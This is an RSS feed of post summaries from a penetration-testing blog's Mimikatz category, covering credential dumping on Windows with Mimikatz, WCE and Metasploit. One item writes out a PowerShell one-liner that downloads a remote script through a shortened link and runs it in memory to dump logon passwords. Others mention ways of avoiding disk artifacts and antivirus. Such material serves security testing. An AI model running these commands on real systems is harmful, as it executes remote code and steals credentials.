<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Mimikatz on </title>
    <link>https://malicious.link/categories/mimikatz/</link>
    <description>Recent content in Mimikatz on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 05 Oct 2013 23:53:52 -0500</lastBuildDate>
    
	<atom:link href="https://malicious.link/categories/mimikatz/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Dumping a domain worth of passwords with mimikatz</title>
      <link>https://malicious.link/post/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/</link>
      <pubDate>Sat, 05 Oct 2013 23:53:52 -0500</pubDate>
      
      <guid>https://malicious.link/post/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/</guid>
      <description>clymb3r recently posted a script called &amp;ldquo;Invoke-Mimikatz.ps1&amp;rdquo; basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL.
You can very easily use this script directly from an admin command prompt as so:
powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -DumpCreds&amp;quot;  (This works REALLY well for Citrix and Kiosk scenarios and it&amp;rsquo;s too hard to type/remember) This runs the powershell script by directly pulling it from Github and executing it &amp;ldquo;in memory&amp;rdquo; on your system.</description>
    </item>
    
    <item>
      <title>Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</title>
      <link>https://malicious.link/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</link>
      <pubDate>Fri, 07 Jun 2013 15:00:08 +0000</pubDate>
      
      <guid>https://malicious.link/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</guid>
      <description>Mimikatz is now built into Metasploit&amp;rsquo;s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don&amp;rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&amp;rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.</description>
    </item>
    
    <item>
      <title>Sessiondump Meterpreter Extension</title>
      <link>https://malicious.link/post/2013/2013-04-08-sessiondump-meterpreter-extension/</link>
      <pubDate>Mon, 08 Apr 2013 09:58:20 +0000</pubDate>
      
      <guid>https://malicious.link/post/2013/2013-04-08-sessiondump-meterpreter-extension/</guid>
      <description>Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory {link} - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.
Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:</description>
    </item>
    
    <item>
      <title>Completely In-memory Mimikatz with Metasploit</title>
      <link>https://malicious.link/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/</link>
      <pubDate>Thu, 06 Sep 2012 03:16:47 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/</guid>
      <description>Executing WCE.exe in memory as demoed by Egypt here: https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram has two issues with it. 1, you leave a file on disk with your hashes and clear text passwords. That just won&amp;rsquo;t do. 2. There is this DLL called WCEAUX.dll that gets written for the briefest second to disk:
(yes I realize I&amp;rsquo;m running this on disk &amp;lsquo;wce32.exe&amp;rsquo;, but it exhibits the same DLL drop when doing in-memory)
Now, don&amp;rsquo;t get me wrong, I love WCE, and Hernan Ochoa does an amazing job with it, but when it comes down to it, it&amp;rsquo;s the best tool for the job.</description>
    </item>
    
    <item>
      <title>Integration of Mimikatz into Metasploit Stage1</title>
      <link>https://malicious.link/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/</link>
      <pubDate>Fri, 15 Jun 2012 14:55:55 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/</guid>
      <description>One of the powers of Metasploit is it&amp;rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.
Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked.</description>
    </item>
    
    <item>
      <title>phDays in Moscow</title>
      <link>https://malicious.link/post/2012/2012-04-26-phdays-in-moscow/</link>
      <pubDate>Thu, 26 Apr 2012 21:33:58 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-04-26-phdays-in-moscow/</guid>
      <description>A friend of mine is presenting at phDays in Moscow at the end of May. If you are in the area, or can be, I would highly recommend you attend, and in particularly his talk.
His blog is here: http://blog.gentilkiwi.com/
And since a picture is worth a thousand words:
You should really go check out what he is going to present&amp;hellip; just sayin&amp;rsquo;</description>
    </item>
    
  </channel>
</rss>